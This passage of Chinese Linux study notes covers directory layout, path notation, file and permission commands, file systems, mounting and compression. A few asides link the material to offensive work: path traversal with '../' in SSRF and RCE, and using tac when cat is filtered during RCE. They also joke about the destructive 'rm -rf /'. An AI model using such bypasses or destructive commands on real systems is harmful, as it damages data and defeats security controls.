</p><p>/usr/lib/与这个目录相似</p></blockquote><p><code>/usr/local/</code></p><blockquote><p>系统管理员在本机自行安装自己下载的软件（非distribution默认提供者），建议安装到此目录,这样会比较便于管理</p></blockquote><p><code>/usr/sbin/</code></p><blockquote><p>非系统正常运行所需要的系统指令。最常见的就是某些网络服务器软件的服务指令（daemon） 基本功能和/sbin 查不到,因此目前 /sbin 就是链接到这个目录中的</p></blockquote><p><code>/usr/share/</code></p><blockquote><p>主要放置只读架构的数据文件,当然也包括共享文件。在这个目录下放 置的数据几乎是不分硬件架构均可读取的数据，因为几乎都是文字文件</p></blockquote><p>第二部分</p><p><code>/usr/games/</code></p><blockquote><p>顾名思义,就是与游戏相关的数据放置的地方</p></blockquote><p><code>/usr/include/</code></p><blockquote><p>c/c++等程序语言的文件开始（header）与包含档（include）放置处,当我们以tarball方式 （*.tar.gz 的方式安装软件）安装某些数据时，会使用到里头的许多包含档</p></blockquote><p><code>/usr/libexec/</code></p><blockquote><p>某些不被一般使用者惯用的可执行文件或脚本（script）等等，都会放置在此目录</p></blockquote><p><code>/usr/src/</code></p><blockquote><p>一般源代码建议放置到这里，src有source的意思。至于核心源代码则建议放置到/usr/src/linux/目录下。 </p></blockquote><hr><blockquote><p><strong>/var</strong> 的意义与内容</p></blockquote><p>为/var目录主要针对常态性变动的文件，包括高速缓存（<strong>cache</strong>）、登录文件 （<strong>log file</strong>）以及某些软件运行所产生的文件， 包括程序文件（lock file, run file），或者例如 MySQL数据库的文件等</p><p>第一部分</p><p><code>/var/cache/</code></p><blockquote><p>应用程序本身运行过程中会产生的一些暂存盘</p></blockquote><p><code>/var/lib/</code></p><blockquote><p>程序本身执行的过程中，需要使用到的数据文件放置的目录;举例来说，MySQL的数据库放置到/var/lib/mysql/而rpm的数据库则放到/var/lib/rpm</p></blockquote><p><code>/var/lock/</code></p><blockquote><p>某些设备或者是文件资源一次只能被一个应用程序所使用，如果同时有两个程序使用该设备时，就可能产生一些错误的状况，因此就得要将该设备上锁（lock）以确保该设备只会给单一软件所使用</p></blockquote><p><code>/var/log/</code></p><blockquote><p>比较重要的文件如/var/log/messages, /var/log/wtmp（记录登陆者的信息）</p><p>文件包含的时候都会用到</p></blockquote><p><code>/var/mail/</code></p><blockquote><p>放置个人电子邮件信箱的目录,不过这个目录也被放置到/var/spool/mail/ 目录中,通常这两个目录是互为链接文件啦</p></blockquote><p><code>/var/run/</code></p><blockquote><p>某些程序或者是服务启动后，会将他们的PID放置在这个目录下</p></blockquote><p>PID 后面章节才会学习到</p><p><code>/var/spool/</code></p><blockquote><p>通常放置一些伫列数据，所谓的“伫列”就是排队等待其他程序使用的数据,这些数据被使用后通常都会被删除</p></blockquote><p>CentOS 7 在目录编排上发生的变化, 采用 链接设置</p><ul><li>/bin –&gt; /usr/bin </li><li>/sbin –&gt; /usr/sbin </li><li>/lib –&gt; /usr/lib </li><li>/lib64 –&gt; /usr/lib64 </li><li>/var/lock –&gt; /run/lock </li><li>/var/run –&gt; /run </li></ul><hr><blockquote><p><strong>目录树(directory tree)</strong></p></blockquote><p>在Linux下面，所有的文件与目录都是由根目录开始的,然后再一个一个的分支下来</p><p>因此称这种目录配置方式为: “目录树”</p><p>主要特性有</p><ul><li>目录树的启始点为根目录 （/, root）</li><li>每一个目录不止能使用本地端的 partition 的文件系统，也可以使用网络上的 filesystem .举例来说， 可以利用 Network File System （NFS） 服务器挂载某特定目录等</li><li>每一个文件在此目录树中的文件名（包含完整路径）都是独一无二的</li></ul><p><img src="https://i.loli.net/2020/01/29/owgVvtjFEkKuA3q.png" alt="目录树架构"></p><hr><blockquote><p><strong>绝对路径与相对路径</strong>(Linux系统中)</p></blockquote><p>根据文件名写法的不同，也可将所谓的路径（path）定义为绝对路径（absolute）与相对路径 (relative)</p><ul><li>绝对路径：由<strong>根目录（/）开始写起</strong>的文件名或目录名称， 例如/home/dmtsai/.bashrc； </li><li>相对路径：相<strong>对于目前路径</strong>的文件名写法。 例如 ./home/dmtsai 或 ../../home/dmtsai/ 等等。反正开头不是 / 就属于相对路径的写法</li></ul><blockquote><p>. ：代表当前的目录，也可以使用 ./ 来表示</p><p>.. ：代表上一层目录，也可以 ../ 来代表</p><p>这个在SSRF,RCE中,或者其他地方经常用到</p></blockquote><p>(<a href="https://i.loli.net/2020/01/29/ZwrnDVotP6FbgJX.png" target="_blank" rel="noopener">https://i.loli.net/2020/01/29/ZwrnDVotP6FbgJX.png</a>)</p><h1 id="0x06-Linux-文件与目录管理"><a href="#0x06-Linux-文件与目录管理" class="headerlink" title="0x06    Linux 文件与目录管理"></a>0x06    Linux 文件与目录管理</h1><blockquote><p>目录的相关操作</p></blockquote><ul><li>. 代表此层目录 </li><li>.. 代表上一层目录 </li><li>- 代表前一个工作目录 </li><li>~ 代表“目前使用者身份”所在的主文件夹 </li><li>~account 代表 account 这个使用者的主文件夹（account是个帐号名称） </li></ul><blockquote><p>处理目录的指令</p></blockquote><ul><li>cd : 变换目录(change directory)</li><li>pwd: 显示目前的目录(Print Working Directory)</li><li>mkdir: 创建一个新的目录(make directory)</li><li>rmdir: 删除一个空的目录</li></ul><p><code>~</code>代表个人的主文件夹</p><blockquote><p>可执行文件路径的变量: $PATH</p></blockquote><p>使用<code>echo $PATH</code></p><p>添加$PATH, <code>PATH=&quot;${PATH}:/root&quot;</code> 表示,将/root加入到PATH当中</p><p><code>ls</code>(list的缩写),检视文件与目录,<code>cp</code>复制,<code>rm</code>删除,<code>mv</code>移动,分别是(copy),(remove),(move)的缩写</p><p>实际情况下,不知道怎么用了就可以使用 <code>man</code> 或者<code>--help</code></p><p><code>cp</code></p><blockquote><p>-a ：相当于 -dr –preserve=all 的意思，至于 dr 请参考下列说明；（常用） </p><p>-d ：若来源文件为链接文件的属性（link file），则复制链接文件属性而非文件本身； </p><p>-f ：为强制（force）的意思，若目标文件已经存在且无法打开，则移除后再尝试一次； </p><p>-i ：若目标文件（destination）已经存在时，在覆盖时会先询问动作的进行（常用） </p><p>-l ：进行硬式链接（hard link）的链接文件创建，而非复制文件本身； </p><p>-p ：连同文件的属性（权限、用户、时间）一起复制过去，而非使用默认属性（备份常用）； </p><p>-r ：递回持续复制，用于目录的复制行为；（常用） </p><p>-s ：复制成为符号链接文件 （symbolic link），亦即“捷径”文件； </p><p>-u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制。 </p><p>–preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, links, xattr 等也复制了。 </p><p>最后需要注意的，如果来源文件有两个以上，则最后一个目的文件一定要是“目录”才行！ </p></blockquote><p><code>rm</code></p><blockquote><p>-f ：就是 force 的意思，忽略不存在的文件，不会出现警告讯息； </p><p>-i ：互动模式，在删除前会询问使用者是否动作 </p><p>-r ：递回删除啊！最常用在目录的删除了.这是非常危险的选项,例如 rm -rf / 哈哈</p></blockquote><p><code>mv</code></p><blockquote><p>-f ：force 强制的意思，如果目标文件已经存在，不会询问而直接覆盖</p><p>-i ：若目标文件 （destination） 已经存在时，就会询问是否覆盖</p><p>-u ：若目标文件已经存在，且 source 比较新，才会更新 （update） </p></blockquote><hr><blockquote><p><strong>取得路径的文件名称与目录名称</strong></p></blockquote><p>每个文件的完整文件名包含了前面的目录与最终的文件名，而每个文件名的长度都可以到达255 个字符</p><p><code>basename</code></p><p>取得最后的文件名</p><p><code>dirname</code></p><p>取得的目录名</p><hr><blockquote><p><strong>文件内容查阅</strong></p></blockquote><ul><li>cat 由第一行开始显示文件内容 </li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写</li><li>nl 显示的时候，顺道输出行号</li><li>more 一页一页的显示文件内容 </li><li>less 与 more 类似，但是比 more 更好的是，他可以往前翻页</li><li>head 只看头几行 </li><li>tail 只看尾巴几行 </li><li>od 以二进制的方式读取文件内容</li></ul><hr><blockquote><p><strong>直接检视文件内容</strong></p></blockquote><p><code>cat(concatenate)</code></p><ul><li>-A ：相当于 -vET 的整合选项，可列出一些特殊字符而不是空白而已； </li><li>-b ：列出行号，仅针对非空白行做行号显示，空白行不标行号！ </li><li>-E ：将结尾的断行字符 $ 显示出来； </li><li>-n ：打印出行号，连同空白行也会有行号，与 -b 的选项不同； </li><li>-T ：将 [tab] 按键以 ^I 显示出来； </li><li>-v ：列出一些看不出来的特殊字符</li></ul><p><code>tac</code>(<strong>反向读取</strong>),这个在<strong>RCE中ban掉了cat等的时候会用到</strong></p><p><code>nl</code>(添加行号打印)</p><ul><li>-b ：指定行号指定的方式，主要有两种： -b a ：表示不论是否为空行，也同样列出行号（类似 cat -n）； -b t ：如果有空行，空的那一行不要列出行号（默认值）； </li><li>-n ：列出行号表示的方法，主要有三种： -n ln ：行号在屏幕的最左方显示； -n rn ：行号在自己字段的最右方显示，且不加 0 ； -n rz ：行号在自己字段的最右方显示，且加 0 ； </li><li>-w ：行号字段的占用的字符数。 </li></ul><hr><blockquote><p><strong>可翻页检视</strong></p></blockquote><p><code>more</code>(只能向后翻)</p><ul><li>空白键 （space）：代表向下翻一页； </li><li>Enter ：代表向下翻“一行”； </li><li>/字串 ：代表在这个显示的内容当中，向下搜寻“字串”这个关键字； </li><li>:f ：立刻显示出文件名以及目前显示的行数； </li><li>q ：代表立刻离开 more ，不再显示该文件内容。 </li><li>b 或 [ctrl]-b ：代表往回翻页，不过这动作只对文件有用，对管线无用。</li></ul><p><code>less</code></p><ul><li>[pagedown]：向下翻动一页； </li><li>[pageup] ：向上翻动一页； </li><li>/字串 ：向下搜寻“字串”的功能； </li><li>?字串 ：向上搜寻“字串”的功能； </li><li>n ：重复前一个搜寻 （与 / 或 ? 有关！） </li><li>N ：反向的重复前一个搜寻 （与 / 或 ? 有关！） </li><li>g ：前进到这个数据的第一行去； </li><li>G ：前进到这个数据的最后一行去 （注意大小写）； </li><li>q ：离开 less 这个程序； </li></ul><hr><blockquote><p><strong>修改文件时间或者创建新文件</strong></p></blockquote><p><code>touch</code></p><p>Linux下主要有三个变动时间</p><ul><li><strong>modification time</strong> （<strong>mtime</strong>）： 当该文件的“内容数据”变更时，就会更新这个时间！内 容数据指的是文件的内容，而不是文件的属性或权限</li><li><strong>status time</strong> （<strong>ctime</strong>）： 当该文件的“状态 （status）”改变时，就会更新这个时间，举 例来说，像是权限与属性被更改了，都会更新这个时间啊。 </li><li><strong>access time</strong> （<strong>atime</strong>）： 当“该文件的内容被取用”时，就会更新这个读取时间 （access）。举例来说，我们使用 cat 去读取 /etc/man_db.conf ， 就会更新该文件的 atime 了</li></ul><p>默认显示mtime</p><p>touch最常使用的情况</p><ul><li>创建一个空的文件； </li><li>将某个文件日期修订为目前 （mtime 与 atime）  </li></ul><hr><blockquote><p><strong>文件与目录的默认权限与隐藏权限</strong></p></blockquote><p>除了基本r, w, x权限外，在Linux传统的Ext2/Ext3/Ext4文件系统下，我们还可以设置其他的系 统隐藏属性， 这部份可使用 <strong>chattr</strong> 来设置，而以 <strong>lsattr</strong> 来查看，最重要的属性就是可以<strong>设置其不可修改的特性</strong></p><blockquote><p><strong>文件默认权限</strong> :umask</p></blockquote><p>umask 的分数指的是,该默认值需要减掉的权限</p><ul><li>若使用者创建为“文件”则默认“没有可执行（ x ）权限”，亦即只有 rw 这两个项目，也就是最大为 666 分，默认权限如下： -rw-rw-rw- </li><li>若使用者创建为“目录”，则由于 x 与是否可以进入此目录有关，因此默认为所有权限均开放，亦即为 777 分，默认权限如下： drwxrwxrwx</li></ul><p>root 的 umask 默认是 022 </p><blockquote><p><strong>文件隐藏属性</strong></p></blockquote><p><code>chattr</code> 设置文件隐藏属性</p><ul><li>+ ：增加某一个特殊参数，其他原本存在参数则不动。 </li><li>- ：移除某一个特殊参数，其他原本存在参数则不动。 </li><li>= ：设置一定，且仅有后面接的参数 </li><li>A ：当设置了 A 这个属性时，若你有存取此文件（或目录）时，他的存取时间 atime 将不会被修改，可避免 I/O 较慢的机器过度的存取磁盘。（目前建议使用文件系统挂载参数处理这个项目） </li><li>S ：一般文件是非同步写入磁盘的（原理请参考<a href="../Text/index.html#sync">前一章sync</a>的说明），如果加上 S 这个属性时，当你进行任何文件的修改，该更动会“同步”写入磁盘中。 </li><li>a ：当设置 a 之后，这个文件将只能增加数据，而不能删除也不能修改数据，只有root 才能设置这属性 </li><li>c ：这个属性设置之后，将会自动的将此文件“压缩”，在读取的时候将会自动解压缩,但是在储存的时候，将会先进行压缩后再储存（对于大文件似乎蛮有用的） </li><li>d ：当 dump 程序被执行的时候，设置 d 属性将可使该文件（或目录）不会被 dump 备份 </li><li>i ：这个 i 可就很厉害了！他可以让一个文件“不能被删除、改名、设置链接也无法写入或新增数据！” 对于系统安全性有相当大的助益！只有 root 能设置此属性 </li><li>s ：当文件设置了 s 属性时，如果这个文件被删除,他将会被完全的移除出这个硬盘空间，所以如果误删了,完全无法救回来了 </li><li>u ：与 s 相反的，当使用 u 来设置文件时，如果该文件被删除了，则数据内容其实还存在磁盘中,可以使用来救援该文件</li></ul><p><strong>最重要的当属 +i 与 +a 这个属性, +i让一个文件无法被改动,+a 可以增加但是不能修改原来的参数</strong></p><p><code>lsattr</code> 显示文件隐藏属性</p><ul><li>-a ：将隐藏文件的属性也秀出来</li><li>-d ：如果接的是目录，仅列出目录本身的属性而非目录内的文件名</li><li>-R ：连同子目录的数据也一并列出来</li></ul><blockquote><p><strong>文件特殊权限</strong></p></blockquote><p><strong>SUID, SGID, SBIT</strong></p><p><code>Set UID</code>,简称 SUID 的特殊权限</p><ul><li>SUID 权限仅对二进制程序（binary program）有效</li><li>执行者对于该程序需要具有 x 的可执行权限 </li><li>本权限仅在执行该程序的过程中有效 （run-time） </li><li>执行者将具有该程序拥有者 （owner） 的权限</li></ul><p><code>Set GID</code></p><p>当 s 标志在文件拥有者的 x 项目为 SUID，那 s 在群组的 x 时则称为 Set GID</p><p>与 SUID 不同的是<strong>，SGID 可以针对文件或目录来设置</strong></p><ul><li>SGID 对二进制程序有用</li><li>程序执行者对于该程序来说,需要X权限</li><li>执行者在执行的过程中将会获得该程序群组的支持</li></ul><p>当目录设置了SGID 的权限后,</p><ul><li>使用者若对于此目录具有 r 与 x 的权限时，该使用者能够进入此目录； </li><li>使用者在此目录下的有效群组（effective group）将会变成该目录的群组； </li><li>用途：若使用者在此目录下具有 w 的权限（可以新建文件），则使用者所创建的新文件，该新文件的群组与此目录的群组相同</li></ul><p><code>Sticky Bit</code></p><p>个 Sticky Bit, SBIT 目前只针对目录有效，对于文件已经没有效果了</p><ul><li>当使用者对于此目录具有 w, x 权限，亦即具有写入的权限时； </li><li>当使用者在该目录下创建文件或目录时，<strong>仅有自己与 root 才有权力删除该文件</strong></li></ul><blockquote><p><strong>SUID/SGID/SBIT 权限设置</strong></p></blockquote><ul><li>4 &gt;&gt; SUID</li><li>2 &gt;&gt; SGID</li><li>1 &gt;&gt; SBIT</li></ul><p>例如 :    <code>chmod 4755 filename</code> 即在原来的755前面加上4</p><p><strong>SUID 为 u+s ，而 SGID 为 g+s ， SBIT 则是 o+t</strong> </p><hr><blockquote><p><strong>观察文件类型: file</strong></p></blockquote><pre><code>root@ifonlys-kali:~# file /etc/passwd/etc/passwd: ASCII text</code></pre><hr><blockquote><p><code>which</code> (寻找”可执行文件”)</p></blockquote><pre><code>which [-a] command</code></pre><p>-a ：将所有由 PATH 目录中可以找到的指令均列出，而不止第一个被找到的指令名称</p><pre><code>root@ifonlys-kali:~# which ifconfig/usr/sbin/ifconfig</code></pre><p>这个指令是故居”PATH”这个环境变量所规范的路径,去搜寻”可执行文件”的文件名</p><blockquote><p><strong>文件文件名的搜寻</strong></p></blockquote><p><code>whereis</code>(由一些特定的目录中寻找文件文件名)</p><ul><li>-l :可以列出 whereis 会去查询的几个主要目录而已 </li><li>-b :只找 binary 格式的文件 </li><li>-m :只找在说明文档 manual 路径下的文件 </li><li>-s :只找 source 来源文件 </li><li>-u :搜寻不在上述三个项目当中的其他特殊文件</li></ul><pre><code>root@ifonlys-kali:~# whereis ifconfigifconfig: /usr/sbin/ifconfig /usr/share/man/man8/ifconfig.8.gz</code></pre><p>会把全部的文件名都列出来了</p><p><strong>whereis 主要是针对 /bin /sbin 下面的可执行文件， 以及 /usr/share/man 下面的 man page 文件，跟几个比较特定的目录来处理而已,故速度更快</strong></p><p><code>locate/ updatedb</code></p><ul><li>-i ：忽略大小写的差异； </li><li>-c ：不输出文件名，仅计算找到的文件数量 </li><li>-l ：仅输出几行的意思，例如输出五行则是 -l 5 </li><li>-S ：输出 locate 所使用的数据库文件的相关信息，包括该数据库纪录的文件/目录数量等 </li><li>-r ：后面可接正则表达式的显示方式 </li></ul><p>locate的使用非常简单,直接在后面输入”文件的部分名称”,就能得到结果</p><p>因为 locate 寻找的数据是由“已创建的数据库 <strong>/var/lib/mlocate/</strong>里面的数据所搜寻到的,故速度较快</p><p>使用<code>updatedb</code> 手动更新<code>locate</code>数据库,updatedb 指令会去读取 /etc/updatedb.conf 这个配置文件的设置，然 后再去硬盘里面进行搜寻文件名的动作， 最后就更新整个数据库文件 ,因为会去搜寻硬盘,速度较慢</p><ul><li>updatedb：根据 /etc/updatedb.conf 的设置去搜寻系统硬盘内的文件名，并更新/var/lib/mlocate 内的数据库文件； </li><li>locate：依据 /var/lib/mlocate 内的数据库记载，找出使用者输入的关键字文件名。</li></ul><p><code>find</code></p><p>因为find在寻找数据的时候是在硬盘中搜寻,故没事不要用find</p><hr><blockquote><p><strong>权限与指令间的关系</strong> </p></blockquote><p>1)使用者能进入某目录成为”可工作目录”的基本权限</p><ul><li>可使用的指令：例如 cd 等变换工作目录的指令； </li><li>目录所需权限：使用者对这个目录至少需要具有 x 的权限 </li><li>额外需求：如果使用者想要在这个目录内利用 ls 查阅文件名，则使用者对此目录还需要 r的权限。 </li></ul><p>2)使用者在某个目录内读取一个文件的基本权限</p><ul><li>可使用的指令：例如本章谈到的 cat, more, less等等 </li><li>目录所需权限：使用者对这个目录至少需要具有 x 权限； </li><li>文件所需权限：使用者对文件至少需要具有 r 的权限才行</li></ul><p>3)使用者可以修改一个文件的基本权限</p><ul><li>可使用的指令：例如 nano 或未来要介绍的 vi 编辑器等； </li><li>目录所需权限：使用者在该文件所在的目录至少要有 x 权限； </li><li>文件所需权限：使用者对该文件至少要有 r, w 权限</li></ul><p>4)使用者可以创建一个文件的基本权限</p><ul><li>目录所需权限：使用者在该目录要具有 w,x 的权限，重点在 w</li></ul><p>5)使用者进入某目录并执行该目录下的某个指令的基本权限</p><ul><li>目录所需权限：使用者在该目录至少要有 x 的权限</li><li>文件所需权限：使用者在该文件至少需要有 x 的权限</li></ul><p><img src="https://i.loli.net/2020/01/29/iML9nwGdmAPFva3.png" alt="第六章重点"></p><h1 id="0x07-Linux-磁盘与文件系统管理"><a href="#0x07-Linux-磁盘与文件系统管理" class="headerlink" title="0x07    Linux 磁盘与文件系统管理"></a>0x07    Linux 磁盘与文件系统管理</h1><p>每种操作系统能够使用的文件系统并不相同.windows 98 以前的微软操作系统主要利用的文件系统是 FAT （或 FAT16），windows 2000 以后的版本 有所谓的 NTFS 文件系统，至于 Linux 的正统文件系统则为 Ext2 （Linux second extended file system, ext2fs）这一个。此外，在默认的情况下，windows 操作系统是不会认识 Linux的 Ext2 的</p><ul><li><p>superblock：记录此 filesystem 的整体信息，包括inode/block的总量、使用量、剩余量,以及文件系统的格式与相关信息等</p></li><li><p>inode：记录<strong>文件的属性</strong>，一个文件占用一个inode，同时记录此文件的数据所在的 block号码</p></li><li><p>block：实际记录<strong>文件的内容</strong>，若文件太大时，会占用多个 block</p></li></ul><p><img src="https://i.loli.net/2020/01/29/M5vZDWuXn849EJN.png" alt="inode/block"></p><p>上面这种数据存取的方法称为索引式文件系统(indexed allocation)</p><p><strong>所谓磁盘重组,因就是文件写入的 block 太过于离散了，</strong> </p><p><strong>此时文件读取的性能将会变的很差所致</strong>这个时候可以通过磁盘重组<strong>将同一个文件所属的 blocks 汇整在一起</strong>，这样数据的读取会比较容易</p><blockquote><p>由于 Ext2 是索引式文件系统，基本上不太需要常常进行磁盘重组</p></blockquote><p><img src="https://i.loli.net/2020/01/29/ASH5s83cMvR9gDt.png" alt></p><p>文件系统最前面有一个开机扇区(boot sector),可以安装开机管理程序</p><p><code>data block</code>(数据区块)</p><blockquote><p>data block 是用来放置文件内容数据地方，在 Ext2 文件系统中所支持的 block 大小有 1K, 2K及 4K 三种</p></blockquote><p><code>inode table</code> </p><p>inode 记录的文件数据至少有下面这些</p><ul><li><p>该文件的存取模式（read/write/excute）</p></li><li><p>该文件的拥有者与群组（owner/group）</p></li><li><p>该文件的容量</p></li><li><p>该文件创建或状态改变的时间（ctime）</p></li><li><p>最近一次的读取时间（atime）</p></li><li><p>最近修改的时间（mtime）</p></li><li><p>定义文件特性的旗标（flag），如 SetUID…</p></li><li><p>该文件真正内容的指向 （pointer</p></li><li><p>每个 inode 大小均固定为 128 Bytes （新的 ext4 与 xfs 可设置到 256 Bytes）； </p></li><li><p>每个文件都仅会占用一个 inode 而已； </p></li><li><p>承上，因此文件系统能够创建的文件数量与 inode 的数量有关； </p></li><li><p>系统读取文件时需要先找到 inode，并分析 inode 所记录的权限与使用者是否符合，若符 合才能够开始实际读取 block 的内容</p></li></ul><p><code>Superblock</code> (超级区块)</p><p>Superblock 是记录整个 filesystem 相关信息的地方， 没有 Superblock ，就没有这个filesystem .记录的信息有</p><ul><li>block 与 inode 的总量； </li><li>未使用与已使用的 inode / block 数量； </li><li>block 与 inode 的大小 （block 为 1, 2, 4K，inode 为 128Bytes 或 256Bytes）； </li><li>filesystem 的挂载时间、最近一次写入数据的时间、最近一次检验磁盘 （fsck） 的时间 等文件系统的相关信息； </li><li>一个 valid bit 数值，若此文件系统已被挂载，则 valid bit 为 0 .若未被挂载，则 valid bit 为 1 </li></ul><p><strong>Filesystem Description</strong>(文件系统描述说明)</p><p>这个区段可以描述每个 block group 的开始与结束的 block 号码，以及说明每个区段 （superblock, bitmap, inodemap, data block） 分别介于哪一个 block 号码之间</p><p><strong>block bitmap</strong>(区块对照表)</p><p><strong>inode bitmap</strong>(inode 对照表),记录使用与未使用的inode号码</p><p><strong>dumpe2fs</strong> (查询 Ext 家族 superblock 信息的指令)</p><hr><p>挂载点的意义( <strong>mount point</strong>)<br><strong>文件系统与目录树结合</strong>的动作我们称为“挂载”,挂载点一定是目录,该目录为进入该文件系统的入口.因此并不是任何文件系统都能使用,必须要”挂载”到目录树的某个目录后,才能使用该文件系统</p><p>XFS 文件系统在数据的分布上,主要规划为三个部份 , 一个数据区(data section) , 一个文件系统活动登录区(log section), 和一个实时运行区(realtime section)</p><p><code>数据区</code>和之前的ext家族一样</p><p><code>log section</code></p><p>在登录区这个区域主要被用来纪录文件系统的变化，其实有点像是日志区.文件的变化会在这里纪录下来，直到该变化完整的写入到数据区后， 该笔纪录才会被终结</p><p><code>realtime section</code></p><p>当有文件要被创建时，xfs 会在这个区段里面找一个到数个的 extent 区块，将文件放置在这个区块内，等到分配完毕后，再写入到 data section 的 inode 与 block 去</p><p><code>df</code>列出文件系统的整体磁盘使用量</p><ul><li>-a ：列出所有的文件系统，包括系统特有的 /proc 等文件系统； </li><li>-k ：以 KBytes 的容量显示各文件系统； </li><li>-m ：以 MBytes 的容量显示各文件系统； </li><li>-h ：以<strong>人们较易阅读的 GBytes, MBytes, KBytes 等</strong>格式自行显示； </li><li>-H ：以 M=1000K 取代 M=1024K 的进位方式； </li><li>-T ：连同该 partition 的 filesystem 名称 （例如 xfs） 也列出； </li><li>-i ：不用磁盘容量，而以 inode 的数量来显示 </li></ul><p><code>du</code>评估文件系统的磁盘使用量(常用在评估目录所占容量)</p><ul><li>-a ：列出所有的文件与目录容量，因为默认仅统计目录下面的文件量而已。 </li><li>-h ：以人们较易读的容量格式 （G/M） 显示； </li><li>-s ：列出总量而已，而不列出每个各别的目录占用容量； </li><li>-S ：不包括子目录下的总计，与 -s 有点差别。 </li><li>-k ：以 KBytes 列出容量显示； </li><li>-m ：以 MBytes 列出容量显示；</li></ul><hr><blockquote><p>实体链接与符号链接  <strong>ln</strong></p></blockquote><p><strong>Hard Link</strong>( 实体链接, 硬式链接或实际链接)</p><p>hard link 只是在某个目录下新增一笔文件名链接到某 inode 号码的关连记录而已</p><p><img src="https://i.loli.net/2020/01/29/4sQ5C6lxTVAj7nZ.png" alt></p><p><strong>hard link 的限制</strong></p><ul><li>不能跨 Filesystem</li><li>不能 link 目录</li></ul><p><strong>Symbolic Link</strong> (符号链接, 也就是捷径)</p><p> Symbolic link 就是在<strong>创建一个独立的文件</strong>，而这个文件会让<strong>数据的读取指向他 link 的那个文件的文件名</strong></p><p>由于只是利用文件来作为指向的动作,所以当源文件被删除之后,symbolic link 的文件 就 “无法打开某文件”</p><hr><p><code>lsblk</code> 列出系统上的所有磁盘列表</p><ul><li>-d ：仅列出磁盘本身，并不会列出该磁盘的分区数据 </li><li>-f ：同时列出该磁盘内的文件系统名称 (可以列出UUID)</li><li>-i ：使用 ASCII 的线段输出，不要使用复杂的编码 （再某些环境下很有用） </li><li>-m ：同时输出该设备在 /dev 下面的权限数据 （rwx 的数据） </li><li>-p ：列出该设备的完整文件名！而不是仅列出最后的名字而已。 </li><li>-t ：列出该磁盘设备的详细数据，包括磁盘伫列机制、预读写的数据量大小等</li></ul><p><code>blkid</code> 列出设备的UUID等参数</p><p>UUID 是全域单一识别码 <strong>universally unique identifier</strong>，Linux 会将系统内所有的设备都给予一个独一无二的识别码， 这个识别码就可以拿来作为挂载或者是使用这个设备/文件系统</p><p><code>parted</code> 列出磁盘的分区表类型 与 分区信息</p><p>使用 parted xx print 指令 来进行 输出</p><p>磁盘分区</p><p><code>fdisk</code> &gt;&gt; MBR 分区 <code>gdisk</code> &gt;&gt; GPT 分区</p><p><code>partprobe</code> 更新Linux 核心的分区表信息</p><p><strong>磁盘格式化 ( 创建文件系统 )</strong></p><p>使用 <code>mkfs</code> &gt;&gt; make filesystem</p><p><code>umount</code> (将设备文件卸载)</p><ul><li>-f ：强制卸载！可用在类似网络文件系统 （NFS） 无法读取到的情况下</li><li>-l ：立刻卸载文件系统，比 -f 还强</li><li>-n ：不更新 /etc/mtab 情况下卸载</li></ul><p><code>mknod</code>  用于磁盘 / 文件系统参数修订</p><pre><code>mknod 设备文件名 [bcp] [Major] [Minor]</code></pre><p>设置开机挂载</p><p><code>/etc/fatab/  或者  /etc/mtab</code></p><p>系统挂载的<strong>限制</strong></p><ul><li>根目录 / 是必须挂载的﹐而且一定要先于其它 mount point 被挂载进来。 </li><li>其它 mount point 必须为已创建的目录﹐可任意指定﹐但一定要遵守必须的系统目录架构原则 （FHS） </li><li>所有 mount point 在同一时间之内﹐只能挂载一次。 </li><li>所有 partition 在同一时间之内﹐只能挂载一次。 </li><li>如若进行卸载﹐您必须先将工作目录移到 mount point（及其子目录） 之外</li></ul><p><strong>内存交换空间(swap)</strong> 的创建</p><p>以前的年代因为内存不足，因此那个可以暂时将内存程序拿到硬盘中暂放的内存交换空间 （swap） 就显的非常的重要</p><p>利用 GNU 的 parted 进行分区行为</p><p><code>parted [设备] [指令 [参数]]</code></p><p>新增分区 <code>mkpart</code> 显示分区 <code>print</code> 删除分区 <code>rm</code> </p><p><img src="https://i.loli.net/2020/01/30/WRnPM48BeudHxJ6.png" alt="第7章重点"></p><h1 id="0x08-文件与文件系统的压缩-打包与备份"><a href="#0x08-文件与文件系统的压缩-打包与备份" class="headerlink" title="0x08    文件与文件系统的压缩,打包与备份"></a>0x08    文件与文件系统的压缩,打包与备份</h1><p>常见的压缩文件扩展名</p><blockquote><p>*.Z compress 程序压缩的文件； </p><p>*.zip zip 程序压缩的文件； </p><p>*.gz gzip 程序压缩的文件； </p><p>*.bz2 bzip2 程序压缩的文件； </p><p>*.xz xz 程序压缩的文件； </p><p>*.tar tar 程序打包的数据，并没有压缩过； </p><p>*.tar.gz tar 程序打包的文件，其中并且经过 gzip 的压缩 </p><p>*.tar.bz2 tar 程序打包的文件，其中并且经过 bzip2 的压缩 </p><p>*.tar.xz tar 程序打包的文件，其中并且经过 xz 的压缩</p></blockquote><p>Linux 系统常见的压缩指令</p><p><code>gzip</code> , <code>zcat/zmore/zless/zgerp</code></p><p>参数</p><ul><li>-c ：将压缩的数据输出到屏幕上，可通过数据流重导向来处理； </li><li>-d ：解压缩的参数； </li><li>-t ：可以用来检验一个压缩文件的一致性～看看文件有无错误； </li><li>-v ：可以显示出原文件/压缩文件的压缩比等信息； </li><li>-# ：# 为数字的意思，代表压缩等级，-1 最快，但是压缩比最差、-9 最慢，但是压缩比最好！默认是 -6 </li></ul><p><code>bzip2</code> <code>bzcat/bzmore/bzless/bzgerp</code></p><p>gzip是为了取代compress并提供更好的压缩比而成立的 , 那么bzip2 则是为了取代gzip 并提供更佳的压缩比而来的</p><p>用法几乎相同,只是扩展名由<code>.gz</code>变为<code>.bz2</code>而已</p><p><code>xz</code> <code>xzcat/xzmore/xzless/xzgerp</code></p><p>xz的压缩比更高 ,用法和 gzip,bzip2几乎一模一样</p><ul><li>-d ：就是解压缩啊</li><li>-t ：测试压缩文件的完整性，看有没有错误 </li><li>-l ：列出压缩文件的相关信息 </li><li>-k ：保留原本的文件不删除</li><li>-c ：同样的，就是将数据由屏幕上输出的意思</li><li>-# ：同样的，也有较佳的压缩比的意思</li></ul><blockquote><p>打包指令, <strong>tar</strong> </p></blockquote><ul><li>压 缩：<code>tar -j&lt;u&gt;c&lt;/u&gt;v -f filename.tar.bz2</code> 要被压缩的文件或目录名称 </li><li>查 询：<code>tar -j&lt;u&gt;t&lt;/u&gt;v -f filename.tar.bz2</code></li><li>解压缩：<code>tar -j&lt;u&gt;x&lt;/u&gt;v -f filename.tar.bz2 -C</code>欲解压缩的目录 